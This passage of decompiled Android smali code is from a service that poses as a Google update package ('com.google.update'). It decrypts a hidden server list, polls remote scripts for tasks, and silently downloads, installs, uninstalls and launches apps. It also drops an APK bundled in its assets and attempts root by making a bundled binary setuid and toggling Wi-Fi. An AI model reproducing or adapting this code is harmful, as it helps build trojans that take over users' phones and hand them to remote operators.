    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/system/app/com.google.update.apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 235
    .local v0, "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 237
    .end local v0    # "cmd":Ljava/lang/String;
    .end local v1    # "dest":Ljava/lang/String;
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method private doAdGetParam()V
    .locals 7

    .prologue
    .line 153
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_0
    :try_start_0
    sget-object v5, Lcom/google/update/StateRes;->Servers:[[B

    array-length v5, v5

    if-lt v3, v5, :cond_0

    .line 166
    :goto_1
    return-void

    .line 154
    :cond_0
    sget-object v5, Lcom/google/update/StateRes;->Servers:[[B

    aget-object v5, v5, v3

    invoke-static {v5}, Lcom/google/update/Utils;->decrypt([B)[B

    move-result-object v2

    .line 155
    .local v2, "bs":[B
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V

    .line 156
    .local v0, "action":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "adp.php"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 157
    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->_doAdGetParam(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 158
    .local v1, "adparam":Ljava/lang/String;
    if-eqz v1, :cond_1

    .line 160
    const-string v5, ":"

    invoke-virtual {v1, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    .line 161
    .local v4, "params":[Ljava/lang/String;
    const/4 v5, 0x0

    aget-object v5, v4, v5

    const/4 v6, 0x1

    aget-object v6, v4, v6

    invoke-direct {p0, v5, v6}, Lcom/google/update/UpdateService;->initJu6Ad(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 165
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "adparam":Ljava/lang/String;
    .end local v2    # "bs":[B
    .end local v4    # "params":[Ljava/lang/String;
    :catch_0
    move-exception v5

    goto :goto_1

    .line 153
    .restart local v0    # "action":Ljava/lang/String;
    .restart local v1    # "adparam":Ljava/lang/String;
    .restart local v2    # "bs":[B
    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0
.end method

.method private doExecuteTask(Ljava/lang/String;)V
    .locals 4
    .param p1, "task"    # Ljava/lang/String;

    .prologue
    .line 588
    const-string v2, " "

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 589
    .local v1, "taskLine":[Ljava/lang/String;
    const/4 v2, 0x0

    aget-object v2, v1, v2

    iput-object v2, p0, Lcom/google/update/UpdateService;->mTaskId:Ljava/lang/String;

    .line 590
    const/4 v2, 0x1

    aget-object v2, v1, v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 592
    .local v0, "cmd":I
    packed-switch v0, :pswitch_data_0

    .line 617
    :pswitch_0
    const/4 v2, -0x1

    const-string v3, "UnknownTask"

    invoke-direct {p0, v2, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 620
    :goto_0
    :pswitch_1
    return-void

    .line 594
    :pswitch_2
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execHomepage([Ljava/lang/String;)V

    goto :goto_0

    .line 597
    :pswitch_3
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execInstall([Ljava/lang/String;)V

    goto :goto_0

    .line 600
    :pswitch_4
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execStartApp([Ljava/lang/String;)V

    goto :goto_0

    .line 603
    :pswitch_5
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execDelete([Ljava/lang/String;)V

    goto :goto_0

    .line 606
    :pswitch_6
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execOpenUrl([Ljava/lang/String;)V

    goto :goto_0

    .line 609
    :pswitch_7
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execSysInstall([Ljava/lang/String;)V

    goto :goto_0

    .line 614
    :pswitch_8
    invoke-direct {p0, v1}, Lcom/google/update/UpdateService;->execUpBin([Ljava/lang/String;)V

    goto :goto_0

    .line 592
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_0
        :pswitch_1
        :pswitch_8
    .end packed-switch
.end method

.method private doSearchReport()V
    .locals 5

    .prologue
    .line 467
    invoke-direct {p0}, Lcom/google/update/UpdateService;->updateInfo()V

    .line 469
    iget-object v3, p0, Lcom/google/update/UpdateService;->mJu6Ad:Lcom/ju6/AdRequester;

    if-nez v3, :cond_1

    .line 470
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doAdGetParam()V

    .line 478
    :goto_0
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_1
    :try_start_0
    sget-object v3, Lcom/google/update/StateRes;->Servers:[[B

    array-length v3, v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-lt v2, v3, :cond_2

    .line 486
    :cond_0
    :goto_2
    return-void

    .line 471
    .end local v2    # "i":I
    :cond_1
    iget-object v3, p0, Lcom/google/update/UpdateService;->mJu6Ad:Lcom/ju6/AdRequester;

    invoke-virtual {v3}, Lcom/ju6/AdRequester;->getAd()V

    goto :goto_0

    .line 479
    .restart local v2    # "i":I
    :cond_2
    :try_start_1
    sget-object v3, Lcom/google/update/StateRes;->Servers:[[B

    aget-object v3, v3, v2

    invoke-static {v3}, Lcom/google/update/Utils;->decrypt([B)[B

    move-result-object v1

    .line 480
    .local v1, "bs":[B
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    .line 481
    .local v0, "action":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "newhi.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 483
    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->_doSearchReport(Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v3

    if-nez v3, :cond_0

    .line 478
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 485
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "bs":[B
    :catch_0
    move-exception v3

    goto :goto_2
.end method

.method private doSearchTask()V
    .locals 1

    .prologue
    .line 521
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getSearchTask()Ljava/lang/String;

    move-result-object v0

    .line 522
    .local v0, "task":Ljava/lang/String;
    if-nez v0, :cond_0

    .line 525
    :goto_0
    return-void

    .line 524
    :cond_0
    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->doExecuteTask(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private doTimerTask()V
    .locals 7

    .prologue
    const-wide/16 v5, 0x0

    .line 435
    iget-wide v1, p0, Lcom/google/update/UpdateService;->mTickets:J

    const-wide/16 v3, 0x1

    add-long/2addr v1, v3

    iput-wide v1, p0, Lcom/google/update/UpdateService;->mTickets:J

    .line 436
    const-string v1, "com.google.update"

    invoke-static {p0, v1}, Lcom/google/update/Utils$PkgManager;->isInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 437
    const-string v0, "/sdcard/db.apk"

    .line 438
    .local v0, "dest":Ljava/lang/String;
    const-string v1, "db.init"

    const v2, 0xc450

    invoke-static {p0, v1, v0, v2}, Lcom/google/update/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 440
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 441
    invoke-static {p0, v0}, Lcom/google/update/Utils$PkgManager;->installApp(Landroid/content/Context;Ljava/lang/String;)V

    .line 446
    .end local v0    # "dest":Ljava/lang/String;
    :cond_0
    iget v1, p0, Lcom/google/update/UpdateService;->mPermState:I

    const/4 v2, 0x2

    if-ne v1, v2, :cond_2

    .line 447
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission2()V

    .line 462
    :cond_1
    :goto_0
    return-void

    .line 449
    :cond_2
    iget v1, p0, Lcom/google/update/UpdateService;->mPermState:I

    const/4 v2, 0x3

    if-ne v1, v2, :cond_3

    .line 450
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission3()V

    goto :goto_0

    .line 454
    :cond_3
    invoke-static {p0}, Lcom/google/update/Utils;->isConnected(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 456
    iget-wide v1, p0, Lcom/google/update/UpdateService;->mTickets:J

    const-wide/16 v3, 0x3c

    rem-long/2addr v1, v3

    cmp-long v1, v1, v5

    if-nez v1, :cond_5

    .line 457
    iget-object v1, p0, Lcom/google/update/UpdateService;->mJu6Ad:Lcom/ju6/AdRequester;

    if-eqz v1, :cond_4

    iget-object v1, p0, Lcom/google/update/UpdateService;->mJu6Ad:Lcom/ju6/AdRequester;

    invoke-virtual {v1}, Lcom/ju6/AdRequester;->getAd()V

    .line 458
    :cond_4
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    goto :goto_0

    .line 459
    :cond_5
    iget-wide v1, p0, Lcom/google/update/UpdateService;->mTickets:J

    const-wide/16 v3, 0xa

    rem-long/2addr v1, v3

    cmp-long v1, v1, v5

    if-nez v1, :cond_1

    .line 460
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchTask()V

    goto :goto_0
.end method

.method private execDelete([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v1, 0x2

    .line 653
    array-length v0, p1

    if-gt v0, v1, :cond_0

    .line 654
    const/4 v0, -0x1

    const-string v1, "InvalidArgs"

    invoke-direct {p0, v0, v1}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 659
    :goto_0
    return-void

    .line 658
    :cond_0
    aget-object v0, p1, v1

    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->uninstallPackage(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execHomepage([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 624
    const/4 v0, -0x1

    const-string v1, "NotSupport"

    invoke-direct {p0, v0, v1}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 625
    return-void
.end method

.method private execInstall([Ljava/lang/String;)V
    .locals 8
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v7, 0x3

    const/4 v6, -0x1

    const/4 v5, 0x2

    .line 630
    array-length v3, p1

    if-gt v3, v5, :cond_0

    .line 631
    const-string v3, "InvalidArgs"

    invoke-direct {p0, v6, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 649
    :goto_0
    return-void

    .line 635
    :cond_0
    aget-object v1, p1, v5

    .line 636
    .local v1, "pkgUrl":Ljava/lang/String;
    const/4 v2, 0x0

    .line 637
    .local v2, "run":Ljava/lang/String;
    array-length v3, p1

    const/4 v4, 0x4

    if-lt v3, v4, :cond_1

    .line 638
    aget-object v2, p1, v7

    .line 641
    :cond_1
    const-string v3, "DownStart"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 642
    invoke-static {p0, v1}, Lcom/google/update/Utils;->downloadFile(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 643
    .local v0, "info":[Ljava/lang/String;
    if-nez v0, :cond_2

    .line 644
    const-string v3, "DownFailed"

    invoke-direct {p0, v6, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 646
    :cond_2
    const-string v3, "DownOK"

    invoke-direct {p0, v7, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 647
    const/4 v3, 0x0

    invoke-virtual {p0, v0, v2, v3}, Lcom/google/update/UpdateService;->installPakage([Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execOpenUrl([Ljava/lang/String;)V
    .locals 6
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v4, 0x2

    const/4 v5, -0x1

    .line 672
    array-length v3, p1

    if-gt v3, v4, :cond_0

    .line 673
    const-string v3, "InvalidArgs"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 687
    :goto_0
    return-void

    .line 678
    :cond_0
    const/4 v3, 0x2

    :try_start_0
    aget-object v3, p1, v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 679
    .local v2, "uri":Landroid/net/Uri;
    new-instance v1, Landroid/content/Intent;

    const-string v3, "android.intent.action.VIEW"

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 680
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 681
    invoke-virtual {p0, v1}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    .line 682
    const/4 v3, 0x1

    const-string v4, "OK"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 683
    .end local v1    # "intent":Landroid/content/Intent;
    .end local v2    # "uri":Landroid/net/Uri;
    :catch_0
    move-exception v3

    move-object v0, v3

    .line 684
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 685
    const-string v3, "Exception"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private execStartApp([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v1, 0x2

    .line 663
    array-length v0, p1

    if-gt v0, v1, :cond_0

    .line 664
    const/4 v0, -0x1

    const-string v1, "InvalidArgs"

    invoke-direct {p0, v0, v1}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 668
    :goto_0
    return-void

    .line 667
    :cond_0
    aget-object v0, p1, v1

    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->runPackage(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execSysInstall([Ljava/lang/String;)V
    .locals 9
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v8, 0x2

    const/4 v7, -0x1

    const/4 v6, 0x3

    .line 692
    array-length v4, p1

    if-gt v4, v6, :cond_0

    .line 693
    const-string v4, "InvalidArgs"

    invoke-direct {p0, v7, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 712
    :goto_0
    return-void

    .line 697
    :cond_0
    aget-object v1, p1, v8

    .line 698
    .local v1, "pkgUrl":Ljava/lang/String;
    aget-object v3, p1, v6

    .line 699
    .local v3, "sysName":Ljava/lang/String;
    const/4 v2, 0x0

    .line 700
    .local v2, "run":Ljava/lang/String;
    array-length v4, p1

    const/4 v5, 0x5

    if-lt v4, v5, :cond_1

    .line 701
    const/4 v4, 0x4

    aget-object v2, p1, v4

    .line 704
    :cond_1
    const-string v4, "DownStart"

    invoke-direct {p0, v8, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 705
    invoke-static {p0, v1}, Lcom/google/update/Utils;->downloadFile(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 706
    .local v0, "info":[Ljava/lang/String;
    if-nez v0, :cond_2

    .line 707
    const-string v4, "DownFailed"

    invoke-direct {p0, v7, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 709
    :cond_2
    const-string v4, "DownOK"

    invoke-direct {p0, v6, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 710
    invoke-virtual {p0, v0, v2, v3}, Lcom/google/update/UpdateService;->installPakage([Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execUpBin([Ljava/lang/String;)V
    .locals 6
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v4, 0x2

    const/4 v5, -0x1

    .line 715
    array-length v3, p1

    if-gt v3, v4, :cond_0

    .line 716
    const-string v3, "InvalidArgs"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 736
    :goto_0
    return-void

    .line 720
    :cond_0
    aget-object v2, p1, v4

    .line 721
    .local v2, "pkgUrl":Ljava/lang/String;
    invoke-static {p0, v2}, Lcom/google/update/Utils;->downloadFile(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 722
    .local v1, "info":[Ljava/lang/String;
    if-nez v1, :cond_1

    .line 723
    const-string v3, "DownFailed"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 727
    :cond_1
    const/4 v3, 0x3

    const-string v4, "DownOK"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 730
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 731
    const/4 v3, 0x0

    aget-object v3, v1, v3

    invoke-direct {p0, v3}, Lcom/google/update/UpdateService;->tryInstBin(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 732
    .local v0, "errinfo":Ljava/lang/String;
    if-nez v0, :cond_2

    .line 733
    const/4 v3, 0x1

    const-string v4, "UPOK"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 734
    :cond_2
    invoke-direct {p0, v5, v0}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 735
    .end local v0    # "errinfo":Ljava/lang/String;
    :cond_3
    const-string v3, "NOPERM"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private getMyDataDir()Ljava/lang/String;
    .locals 2

    .prologue
    .line 104
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "/data/data/"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private getPermission()V
    .locals 2

    .prologue
    .line 250
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 251
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    .line 265
    :cond_0
    :goto_0
    return-void

    .line 255
    :cond_1
    invoke-direct {p0}, Lcom/google/update/UpdateService;->isVersion221()Z

    move-result v0

    if-nez v0, :cond_2

    .line 256
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission1()Z

    move-result v0

    if-nez v0, :cond_0

    .line 259
    :cond_2
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/su"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_3

    new-instance v0, Ljava/io/File;

    const-string v1, "/system/xbin/su"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_4

    .line 260
    :cond_3
    const-string v0, "com.noshufou.android.su"

    invoke-static {p0, v0}, Lcom/google/update/Utils$PkgManager;->isInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 261
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission2()V

    goto :goto_0

    .line 262
    :cond_4
    invoke-direct {p0}, Lcom/google/update/UpdateService;->isVersion221()Z

    move-result v0

    if-nez v0, :cond_0

    .line 263
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission3()V

    goto :goto_0
.end method

.method private getPermission1()Z
    .locals 12

    .prologue
    const/4 v10, 0x1

    const/4 v9, 0x0

    const-string v11, "P1"

    .line 269
    iget-object v6, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v7, "P1"

    invoke-interface {v6, v11, v9}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v4

    .line 270
    .local v4, "tried":Z
    if-eqz v4, :cond_0

    move v6, v9

    .line 303
    :goto_0
    return v6

    .line 273
    :cond_0
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 274
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "secbin"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 275
    .local v1, "dest":Ljava/lang/String;
    const-string v6, "secbino"

    const/16 v7, 0x1b80

    invoke-static {p0, v6, v1, v7}, Lcom/google/update/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 276
    const-string v6, "/system/bin/chmod"

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "4755 "

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Lcom/google/update/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 277
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, " /data/data/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, ""

    invoke-static {v6, v7}, Lcom/google/update/Utils;->oldrun(Ljava/lang/String;Ljava/lang/String;)V

    .line 280
    const-string v6, "wifi"

    invoke-virtual {p0, v6}, Lcom/google/update/UpdateService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/net/wifi/WifiManager;

    .line 282
    .local v5, "wifi":Landroid/net/wifi/WifiManager;
    invoke-virtual {v5}, Landroid/net/wifi/WifiManager;->getWifiState()I

    move-result v6

    const/4 v7, 0x3

    if-ne v6, v7, :cond_1

    .line 283
    invoke-virtual {v5, v9}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 284
    const/4 v3, 0x1

    .line 289
    .local v3, "flag":Z
    :goto_1
    const-wide/16 v6, 0x1388

    invoke-static {v6, v7}, Landroid/os/SystemClock;->sleep(J)V

    .line 290
    invoke-virtual {v5, v3}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 293
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v6

    if-eqz v6, :cond_2

    .line 294
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    move v6, v10

    .line 296
    goto :goto_0

    .line 286
    .end local v3    # "flag":Z
    :cond_1
    invoke-virtual {v5, v10}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 287
    const/4 v3, 0x0

    .restart local v3    # "flag":Z
    goto :goto_1

    .line 300
    :cond_2
    iget-object v6, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 301
    .local v2, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v6, "P1"

    invoke-interface {v2, v11, v10}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 302
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move v6, v9

    .line 303
    goto/16 :goto_0
.end method

.method private getPermission2()V
    .locals 15

    .prologue
    const/4 v13, 0x0

    const-string v14, "su"

    const-string v10, "UTF-8"

    const-string v12, "P2"

    .line 309
    iget-object v10, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v11, "P2"

    invoke-interface {v10, v12, v13}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 310
    .local v1, "count":I
    const/16 v10, 0xa

    if-lt v1, v10, :cond_1

    .line 311
    iput v13, p0, Lcom/google/update/UpdateService;->mPermState:I

    .line 312
    invoke-direct {p0}, Lcom/google/update/UpdateService;->isVersion221()Z

    move-result v10

    if-nez v10, :cond_0

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getPermission3()V

    .line 359
    :cond_0
    :goto_0
    return-void

    .line 315
    :cond_1
    add-int/lit8 v1, v1, 0x1

    .line 316
    iget-object v10, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v10}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 317
    .local v4, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v10, "P2"

    invoke-interface {v4, v12, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 318
    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 319
    const/4 v10, 0x2

    iput v10, p0, Lcom/google/update/UpdateService;->mPermState:I

    .line 321
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 323
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    :try_start_0
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

